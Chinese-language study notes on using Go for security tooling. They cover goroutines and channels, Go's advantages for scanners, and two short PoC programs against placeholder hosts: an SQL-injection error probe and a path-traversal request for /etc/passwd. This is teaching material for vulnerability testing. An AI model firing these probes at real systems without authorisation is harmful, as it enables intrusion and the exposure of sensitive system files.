使用 `make` 创建 channel。
ch := make(chan int)

表示创建一个 **传输 int 类型的 channel**。
完整示例：
```go
package main
import "fmt"
func main() {
    ch := make(chan int)
    go func() {
        ch <- 10   // 发送数据
    }()
    data := <-ch   // 接收数据
    fmt.Println(data)
}
```

执行流程：
1. goroutine 发送 `10`
2. 主 goroutine 接收
3. 输出 `10`

## Go的安全优势
Go 的 **Goroutine + Channel** 非常适合安全场景。
### **大量并发任务**。
go scan(target)

|语言|并发难度|
|---|---|
|Python|需要 asyncio / 多线程|
|C/C++|pthread 很复杂|
|Java|线程重量级|
|Go|goroutine 极轻量|
### 编译为单个二进制文件
不需要：
- 运行环境
- 依赖库
- Python解释器

### 跨平台能力极强
Linux
Windows
Mac
ARM
MIPS

路由器
IoT
嵌入式
### 网络库非常强
Go 的标准库对 **网络支持非常好**。

### 性能接近 C 语言
Go 是 **编译型语言**。

### 内存安全
- 垃圾回收 GC
- 内存安全
- 不容易出现：
>缓冲区溢出
>UAF
>野指针

### 编译速度极快
Go 编译非常快。
### 在安全圈内流行
## POC
### 本质
最小化代码验证漏洞是否存在
- SQL 注入
- SSRF
- 文件读取
- RCE
- 未授权访问
三件事：
1 发送请求
2 触发漏洞
3 判断响应
```
目标URL
   ↓
发送HTTP请求
   ↓
注入payload
   ↓
分析响应
   ↓
输出漏洞结果
```
实例：
```go
package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"
)

func main() {

	target := "http://example.com/login.php?id=1'"

	resp, err := http.Get(target)
	if err != nil {
		fmt.Println("请求失败:", err)
		return
	}

	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if strings.Contains(string(body), "SQL syntax") {
		fmt.Println("[+] 可能存在SQL注入漏洞")
	} else {
		fmt.Println("[-] 未发现漏洞")
	}
}
```

```go
package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"
)

func main() {

	target := "http://target.com/download?file=../../../../etc/passwd"

	resp, err := http.Get(target)
	if err != nil {
		fmt.Println(err)
		return
	}

	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if strings.Contains(string(body), "root:x:0:0") {
		fmt.Println("[+] 存在任意文件读取漏洞")
	} else {
		fmt.Println("[-] 未发现漏洞")
	}
}
```

### 常用库
net/http
net/url
encoding/json
- cookie
- proxy
- header
github.com/go-resty/resty

|优势|说明|
|---|---|
|并发扫描|goroutine|
|性能高|比 Python 快|
|单文件|渗透部署方便|
|跨平台|Windows/Linux|
|网络库强|HTTP/TCP|
### 类型
Web漏洞 POC
扫描型 POC
利用型 POC

### 区别
Python：
- 适合快速写 PoC
- 生态多
- requests 很方便

Go：
- 并发扫描能力强
- 编译单文件
- 性能高
- 适合做扫描器